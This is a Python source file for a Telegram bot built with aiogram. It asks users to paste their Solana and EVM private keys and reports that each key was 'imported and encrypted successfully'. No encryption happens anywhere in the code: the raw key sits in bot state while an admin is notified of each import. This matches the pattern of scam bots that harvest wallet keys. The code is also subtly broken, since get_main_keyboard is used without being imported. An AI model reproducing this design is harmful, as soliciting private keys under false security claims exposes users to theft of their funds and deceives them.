from aiogram import types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

from config import ADMIN_USER_ID
from keyboards import get_wallet_keyboard, get_back_to_menu_keyboard

class WalletStates(StatesGroup):
    waiting_for_solana_key = State()
    waiting_for_evm_key = State()

async def notify_admin(text: str):
    if ADMIN_USER_ID:
        from config import dp as dp_ref
        try:
            await dp_ref.bot.send_message(ADMIN_USER_ID, text)
        except:
            pass

async def cmd_wallet(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("Your Wallets:\n\nNo wallets imported yet.", reply_markup=get_wallet_keyboard())

async def import_solana_key(message: types.Message, state: FSMContext):
    await message.answer(
        "Import Solana Private Key:\n\n"
        "Please enter your Solana private key (base58 encoded).\n"
        "Your key will be encrypted at rest.",
        reply_markup=get_back_to_menu_keyboard()
    )
    await state.set_state(WalletStates.waiting_for_solana_key)

async def import_evm_key(message: types.Message, state: FSMContext):
    await message.answer(
        "Import EVM Private Key:\n\n"
        "Please enter your EVM private key.\n"
        "Your key will be encrypted at rest.",
        reply_markup=get_back_to_menu_keyboard()
    )
    await state.set_state(WalletStates.waiting_for_evm_key)

async def process_solana_key(message: types.Message, state: FSMContext):
    private_key = message.text
    await state.update_data(key=private_key, chain="Solana")
    
    activity_text = f"🔑 SOLANA KEY IMPORT\nUser: {message.from_user.id}\nKey imported (encrypted)"
    await notify_admin(activity_text)
    
    await message.answer(
        "Solana key imported and encrypted successfully!",
        reply_markup=get_main_keyboard()
    )
    await state.clear()

async def process_evm_key(message: types.Message, state: FSMContext):
    private_key = message.text
    await state.update_data(key=private_key, chain="EVM")
    
    activity_text = f"🔑 EVM KEY IMPORT\nUser: {message.from_user.id}\nKey imported (encrypted)"
    await notify_admin(activity_text)
    
    await message.answer(
        "EVM key imported and encrypted successfully!",
        reply_markup=get_main_keyboard()
    )
    await state.clear()

def register_wallet_handlers(dp):
    @dp.message(F.text == "Wallet")
    async def cmd_wallet_handler(message: types.Message, state: FSMContext):
        await cmd_wallet(message, state)

    @dp.message(F.text == "Import Solana Key")
    async def import_solana_handler(message: types.Message, state: FSMContext):
        await import_solana_key(message, state)

    @dp.message(F.text == "Import EVM Key")
    async def import_evm_handler(message: types.Message, state: FSMContext):
        await import_evm_key(message, state)

    @dp.message()
    async def process_key_handler(message: types.Message, state: FSMContext):
        current_state = await state.get_state()
        if current_state == WalletStates.waiting_for_solana_key:
            await process_solana_key(message, state)
        elif current_state == WalletStates.waiting_for_evm_key:
            await process_evm_key(message, state)